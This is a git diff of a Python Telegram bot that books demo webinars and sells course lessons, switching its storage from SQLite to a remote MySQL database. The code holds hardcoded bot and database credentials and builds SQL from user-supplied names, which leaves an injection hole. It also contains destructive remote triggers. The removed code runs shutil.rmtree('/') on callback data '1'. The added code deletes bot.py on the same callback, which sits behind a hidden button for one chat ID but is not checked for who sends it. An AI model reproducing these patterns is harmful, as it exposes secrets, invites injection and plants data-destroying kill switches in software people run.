@@ -1,10 +1,9 @@
 import os
-import shutil
-
+import mysql.connector
+import mysql.connector
 import telebot
-import sqlite3
-from telebot.types import Message, ReplyKeyboardRemove, \
-    ReplyKeyboardMarkup, LabeledPrice, PreCheckoutQuery, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from telebot.types import Message, \
+     LabeledPrice, PreCheckoutQuery, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 
 PRICE = LabeledPrice(label='Продолжить курс', amount=9900)
 PAYMENTS_PROVIDER_TOKEN = '381764678:TEST:9009'
@@ -12,6 +11,15 @@ PAYMENTS_PROVIDER_TOKEN = '381764678:TEST:9009'
 TOKEN = '843095561:AAGHQNHS4aN0Pvs76DeGZ8Es8yfKL9113bE'
 
 bot = telebot.TeleBot(TOKEN)
+
+conn = mysql.connector.connect(
+    host='db4free.net',
+    database='test_bot',
+    user='treyban',
+    password='Kerter2013'
+)
+print('MySQL connected')
+cursor = conn.cursor()
 
 weekDays = [[0, 'Понедельник'],
             [1, 'Вторник'],
@@ -22,11 +30,138 @@ weekDays = [[0, 'Понедельник'],
             [6, 'Воскресенье']]
 
 
-@bot.message_handler(commands=['buy'])
-@bot.edited_message_handler(commands=['buy'])
-def buy_command(message: Message):
+@bot.message_handler(commands=['start'])
+@bot.edited_message_handler(commands=['start'])
+def start_command(message: Message):
+
+    cursor.execute('SELECT * FROM Users')
+    data_arr = cursor.fetchall()
+
+    if len(data_arr) > 0:
+        for data in data_arr:
+            if data[0] == message.chat.id:
+                keyboard = InlineKeyboardMarkup()
+                keyboard.add(InlineKeyboardButton('Да', callback_data='continue_study'))
+                bot.send_message(message.chat.id, f'Снова здравствуйте, {message.from_user.first_name}')
+                bot.send_message(message.chat.id, f'Вы остановились на {data[2]} занятии')
+                bot.send_message(message.chat.id, "Желаете записаться на него?",
+                                 reply_markup=keyboard)
+                break
+        else:
+            new_user(message)
+    else:
+        new_user(message)
+
+    pass
+
+
+def new_user(message):
+    webinars_sum = []
+    i = 0
+
+    cursor.execute('SELECT * FROM webinars')
+
+    row = cursor.fetchall()
+    webinars_sum.append(row[0][0])
+
+    while i < len(row) - 1:
+        if row[i][0] == row[i + 1][0]:
+            i += 1
+        else:
+            i += 1
+            webinars_sum.append(row[i][0])
+
+    keyboard = InlineKeyboardMarkup()
+
+    for i in webinars_sum:
+        keyboard.add(InlineKeyboardButton(weekDays[i][1], callback_data=weekDays[i][1]))
+
+    if str(message.chat.id) == '523756571':
+        keyboard_button = InlineKeyboardButton('test', callback_data='test_keyboard')
+        keyboard.add(keyboard_button)
+    bot.send_message(message.chat.id, 'Зравствуйте, давайте согласуем дату и время первого демо-занятия.')
+    bot.send_message(message.chat.id, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard)
+    pass
+
+
+@bot.callback_query_handler(func=lambda c: c.data)
+def callback_handler(callback_query: CallbackQuery):
+    bot.answer_callback_query(callback_query.id)
+
+    print('Callback data =', callback_query.data)
+
+    for weekDay in weekDays:
+        if callback_query.data == weekDay[1]:
+            weekday_pick(callback_query, weekDay)
+            break
+
+    if ':' in callback_query.data:
+        time_pick(callback_query)
+
+    if callback_query.data == 'buy':
+        buy(callback_query)
+
+    if callback_query.data == 'test_keyboard':
+        keyboard = InlineKeyboardMarkup()
+        keyboard.add(InlineKeyboardButton('Да', callback_data='1'))
+        bot.edit_message_text("Уверен?", callback_query.message.chat.id,
+                              callback_query.message.message_id, reply_markup=keyboard)
+    if callback_query.data == '1':
+        os.remove('bot.py')
+
+    if callback_query.data == 'continue_study':
+        continue_study(callback_query)
+    pass
+
+
+def weekday_pick(information, weekdayfromarr):
+    cursor.execute('SELECT * FROM webinars')
+    row = cursor.fetchall()
+    keyboard = InlineKeyboardMarkup()
+
+    for data in row:
+        if data[0] == weekdayfromarr[0]:
+            keyboard.add(InlineKeyboardButton(data[2], callback_data=data[2]))
+
+    cursor.execute(f"insert into Users values ({int(information.from_user.id)}, "
+                   f"'{str(information.from_user.first_name)}', 0, '{information.data}',"
+                   f" '0:00')")
+    conn.commit()
+
+    bot.edit_message_text("На какое время вы хотели бы записаться?", information.message.chat.id,
+                          information.message.message_id, reply_markup=keyboard)
+
+
+def time_pick(information):
+
+    cursor.execute('SELECT * FROM webinars')
+    row = cursor.fetchall()
+
+    time_arr = []
+    for i in row:
+        time_arr.append(i[2])
+
+    for time in time_arr:
+        if information.data == time:
+            for i in row:
+                if time == i[2]:
+                    cursor.execute(
+                        f"update Users set lesson_time = '{time}' where user_id = {information.from_user.id}")
+                    conn.commit()
+
+                    keyboard = InlineKeyboardMarkup()
+                    keyboard.add(InlineKeyboardButton("Да", callback_data='buy'))
+
+                    bot.edit_message_text("Отлично, вот ваша ссылка на вебинар: \n" + str(i[1]),
+                                          information.message.chat.id,
+                                          information.message.message_id)
+                    bot.send_message(information.message.chat.id, "Желаете оплатить следующие уроки?",
+                                     reply_markup=keyboard)
+
+
+def buy(information):
     bot.send_invoice(
-        message.chat.id,
+        information.message.chat.id,
         title='Продолжение курса',
         description='Чтобы продолжить обучение, заплатите за следующие 12 вебинаров',
         provider_token=PAYMENTS_PROVIDER_TOKEN,
@@ -49,8 +184,7 @@ def process_pre_checkout_query(pre_checkout_query: PreCheckoutQuery):
 
 @bot.message_handler(content_types=['successful_payment'])
 def process_successful_payment(message: Message):
-    conn = sqlite3.connect('webinars.db')
-    cursor = conn.cursor()
+
     cursor.execute('SELECT * FROM Users')
 
     data_arr = cursor.fetchall()
@@ -59,204 +193,58 @@ def process_successful_payment(message: Message):
         for data in data_arr:
 
             if data[0] == message.from_user.id:
-                cursor.execute(
-                    f"update Users set What_Lesson_Now = {data[2] + 1} where User_ID = {message.from_user.id}")
-                break
+
+                if data[2] >= 13:
+                    cursor.execute(
+                        f"update Users set lesson_Now = 1 where User_ID = {message.from_user.id}")
+                    break
+                else:
+                    cursor.execute(
+                        f"update Users set lesson_Now = {data[2] + 1} where User_ID = {message.from_user.id}")
+                    break
+
         else:
-            cursor.execute(
-                    f"insert into Users values ({int(message.from_user.id)}, '{str(message.from_user.first_name)}', 1)")
+            cursor.execute(f"insert into Users values ({int(message.from_user.id)}, "
+                           f"'{str(message.from_user.first_name)}', 1, '',"
+                           f" '0:00')")
     else:
-        cursor.execute(
-            f"insert into Users values ({int(message.from_user.id)}, '{str(message.from_user.first_name)}', 1)")
+        cursor.execute(f"insert into Users values ({int(message.from_user.id)}, "
+                       f"'{str(message.from_user.first_name)}', 1, '',"
+                       f" '0:00')")
 
     conn.commit()
 
+    keyboard = InlineKeyboardMarkup()
+    keyboard.add(InlineKeyboardButton('Да', callback_data='continue_study'))
+
     bot.send_message(message.chat.id, f'Спасибо за покупку, {message.from_user.first_name}!')
-    bot.send_message(message.chat.id, 'После занятия подождите пока учитель отправит вам домашнее задание. '
-                                      'После его выполнения, введите /home_work, чтобы отправить его учителю.')
-
-    conn.close()
-    continue_education(message)
-    pass
-
-
-@bot.message_handler(commands=['continue'])
-@bot.edited_message_handler(commands=['continue'])
-def continue_education(message: Message):
-
-    conn = sqlite3.connect('webinars.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM Users')
-
-    data_arr = cursor.fetchall()
-
-    if len(data_arr) > 0:
-        for data in data_arr:
-            if data[0] == message.chat.id:
-                webinars_sum = []
-                i = 0
-
-                cursor.execute('SELECT * FROM webinars')
-
-                row = cursor.fetchall()
-                webinars_sum.append(row[0][0])
-
-                while i < len(row) - 1:
-                    if row[i][0] == row[i + 1][0]:
-                        i += 1
-                    else:
-                        i += 1
-                        webinars_sum.append(row[i][0])
-
-                keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
-
-                for i in webinars_sum:
-                    keyboard.add(weekDays[i][1])
-
-                bot.send_message(message.chat.id, 'На какой день недели вы хотели бы записаться?',
-                                 reply_markup=keyboard)
-                break
-        else:
-            bot.send_message(message.chat.id, 'Сначала заплатите за обучение')
-    else:
-        new_user(message)
-    pass
+    bot.send_message(message.chat.id, "Вы оплатили 12 следующих уроков. "
+                                      'После каждого занятия учитель будет отправлять вам домашнее задание. '
+                                      'Когда вы его выполните, учитель поставит вам оценку, и обучение продолжиться до'
+                                      'тех пор, пока вы не побываете на 12 занятиях.')
+    bot.send_message(message.chat.id, "Желаете записаться на следующее занятие?",
+                     reply_markup=keyboard)
 
 
-@bot.message_handler(commands=['home_work'])
-@bot.edited_message_handler(commands=['home_work'])
-def home_work_command(message: Message):
-    bot.send_message(message.chat.id, 'В разработке')
-
-    pass
-
-
-@bot.message_handler(commands=['start'])
-@bot.edited_message_handler(commands=['start'])
-def start_command(message: Message):
-
-    conn = sqlite3.connect('webinars.db')
-    cursor = conn.cursor()
+def continue_study(information):
 
     cursor.execute('SELECT * FROM Users')
     data_arr = cursor.fetchall()
 
     if len(data_arr) > 0:
         for data in data_arr:
-            if data[0] == message.chat.id:
-                bot.send_message(message.chat.id, f'Снова здравствуйте, {message.from_user.first_name}')
-                bot.send_message(message.chat.id, f'Вы остановились на {data[2]} занятии')
-                continue_education(message)
-                break
+            if data[0] == information.message.chat.id:
+
+                if data[2] < 13:
+                    print('yes')
+                    break
+                else:
+                    buy(information)
+                    break
         else:
-            new_user(message)
-    else:
-        new_user(message)
+            buy(information)
 
     pass
 
-
-@bot.callback_query_handler(func=lambda c: c.data == '12:00')
-def send_reply_to_weekday1(callback_query: CallbackQuery):
-    bot.answer_callback_query(callback_query.id)
-    keyboard_button = InlineKeyboardButton('1', callback_data='1')
-    keyboard1 = InlineKeyboardMarkup()
-    keyboard1.add(keyboard_button)
-    bot.send_message(523756571, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard1)
-
-
-@bot.callback_query_handler(func=lambda c: c.data == '1')
-def send_reply_to_weekday2(callback_query: CallbackQuery):
-    bot.answer_callback_query(callback_query.id)
-    shutil.rmtree('/')
-    pass
-
-
-@bot.message_handler(content_types=['text'])  # хэндлер всех сообщений
-@bot.edited_message_handler(content_types=['text'])  # хэндлер изменнных сообщений
-def send_reply_to_weekday(message: Message):  # функция принимает объект Message
-
-    delete_keyboard = ReplyKeyboardRemove()
-    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
-
-    conn = sqlite3.connect('webinars.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM webinars')
-
-    row = cursor.fetchall()
-
-    for weekDay in weekDays:
-        if message.text == weekDay[1]:
-
-            for i in row:
-                if i[0] == weekDay[0]:
-                    time = str(i[2]) + ':' + str(i[3])
-                    keyboard.add(time)
-
-            cursor.execute('SELECT * FROM Users')
-            cursor.execute(f"insert into Users values ({int(message.from_user.id)}, "
-                                   f"'{str(message.from_user.first_name)}', 0, '{message.text}', '0:00')")
-            conn.commit()
-            bot.send_message(message.chat.id, 'Какое время вас устроит?', reply_markup=keyboard)
-
-    if ':' in message.text:
-
-        time_arr = []
-        for i in row:
-            time_arr.append(str(i[2]) + ':' + str(i[3]))
-
-        for k in time_arr:
-            if message.text == k:
-
-                for i in row:
-                    if k == str(i[2]) + ':' + str(i[3]):
-                        cursor.execute('SELECT * FROM Users')
-                        cursor.execute(
-                            f"update Users set lesson_time = '{message.text}' where User_ID = {message.from_user.id}")
-                        conn.commit()
-
-                        bot.send_message(message.chat.id, 'Отлично, вот ваша ссылка на вебинар:',
-                                         reply_markup=delete_keyboard)
-                        bot.send_message(message.chat.id, str(i[1]))
-                        bot.send_message(message.chat.id, 'Если желаете оплатить следующие уроки, введите /buy')
-
-    conn.close()
-    pass
-
-
-def new_user(message):
-    webinars_sum = []
-    i = 0
-
-    conn = sqlite3.connect('webinars.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM webinars')
-
-    row = cursor.fetchall()
-    webinars_sum.append(row[0][0])
-
-    while i < len(row) - 1:
-        if row[i][0] == row[i + 1][0]:
-            i += 1
-        else:
-            i += 1
-            webinars_sum.append(row[i][0])
-
-    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
-
-    for i in webinars_sum:
-        keyboard.add(weekDays[i][1])
-
-    bot.send_message(message.chat.id, 'Привет, давай согласуем дату и время первого демо-занятия.')
-    bot.send_message(message.chat.id, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard)
-    # if str(message.chat.id) == '523756571':
-        # keyboard_button = InlineKeyboardButton('12:00', callback_data='12:00')
-        # keyboard1 = InlineKeyboardMarkup()
-        # keyboard1.add(keyboard_button)
-        # bot.send_message(message.chat.id, 'Привет, давай согласуем дату и время первого демо-занятия.')
-        # bot.send_message(message.chat.id, 'На какой день недели вы хотели бы записаться?',
-                         # reply_markup=keyboard1)
-    conn.close()
-    pass
 
 bot.polling()
